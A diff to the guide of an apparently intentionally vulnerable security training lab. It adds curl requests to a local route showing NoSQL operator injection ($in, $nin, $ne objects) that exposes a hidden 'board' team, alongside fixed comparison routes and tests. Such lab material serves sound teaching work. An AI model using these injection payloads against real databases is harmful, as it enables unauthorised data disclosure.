@@ -327,7 +327,7 @@ The control is scoped to this flaw.
 <a id="mongo-051-student"></a>
 ### Student guide
 
-The array branch of this route is careful: it filters `board` out of the list and feeds `$in`. The scalar branch — the same parameter, sent as one value instead of a list — is not: the value keeps its shape, and the `board` refusal is a string comparison that an object passes. So `{"$regex":".*"}` lists the team the route refuses by name. The twin handles both branches against the same constant list, so the scalar falls to `'none'`. The second control fixes the operator (`$nin`) and only lets the request add *exclusions*, which cannot disclose the board team.
+The array branch of this route is careful: it filters `board` out of the list and feeds `$in`. The scalar branch — the same parameter, sent as one value instead of a list — is not: the value keeps its shape, and the `board` refusal is a string comparison that an object passes. So `{"$regex":".*"}` lists the team the route refuses by name, and `{"$in":["board"]}` or `{"$nin":["floor"]}` selects it with the operator itself as the object. The twin handles both branches against the same constant list, so the scalar falls to `'none'`. The second control fixes the operator (`$nin`) and only lets the request add *exclusions*, which cannot disclose the board team.
 
 <a id="mongo-051-exploit"></a>
 ### Exploit lab
@@ -354,6 +354,46 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/people/others -H 'Content-Typ
 # people: alice only — the board team stays excluded
 ```
 
+The scalar branch also takes the operator itself as the object:
+
+```bash
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/teams -H 'Content-Type: application/json' \
+  -d '{"teams":{"$in":["board"]}}'
+# people include admin
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/teams -H 'Content-Type: application/json' \
+  -d '{"teams":{"$nin":["floor"]}}'
+# people include admin
+```
+
+The third route, `others`, does not read `teams`, so the first input never reaches its `$nin`. These inputs repeat the attack through its own key, `without` — as a name, and as an operator:
+
+```bash
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/teams -H 'Content-Type: application/json' \
+  -d '{"teams":{"$in":["board"]},"without":["floor"]}'
+# people include admin
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/units -H 'Content-Type: application/json' \
+  -d '{"teams":{"$in":["board"]},"without":["floor"]}'
+# people: none
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/others -H 'Content-Type: application/json' \
+  -d '{"teams":{"$in":["board"]},"without":["floor"]}'
+# {"people":[]} — a name can only exclude
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/teams -H 'Content-Type: application/json' \
+  -d '{"teams":{"$nin":["floor"]},"without":[{"$ne":"board"}]}'
+# people include admin
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/units -H 'Content-Type: application/json' \
+  -d '{"teams":{"$nin":["floor"]},"without":[{"$ne":"board"}]}'
+# people: none
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/people/others -H 'Content-Type: application/json' \
+  -d '{"teams":{"$nin":["floor"]},"without":[{"$ne":"board"}]}'
+# status 500 — the server refuses an operator inside $nin; no person is returned
+```
+
 **Observation that proves exploitation:** only the scalar-branch route returns the board row for the identical value.
 
 <a id="mongo-051-safe"></a>
@@ -365,10 +405,10 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/people/others -H 'Content-Typ
 | `pages/api/workshop/people/units.js` | protected | Both branches keep only the two constant names; anything else falls to `$in []` or `'none'`. |
 | `pages/api/workshop/people/others.js` | protected | The operator is fixed and the values are elements of `$nin`; an operator object inside the array is refused by the server. |
 
-The control is scoped to this flaw.
+The control is scoped to this flaw. `others` reads `without` instead of `teams`; through that key the request can only add exclusions.
 
 <a id="mongo-051-tests"></a>
 ### Automated tests
 
-- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
+- `tests/unit/workshop-scenarios.test.mjs`: each input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
 - `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
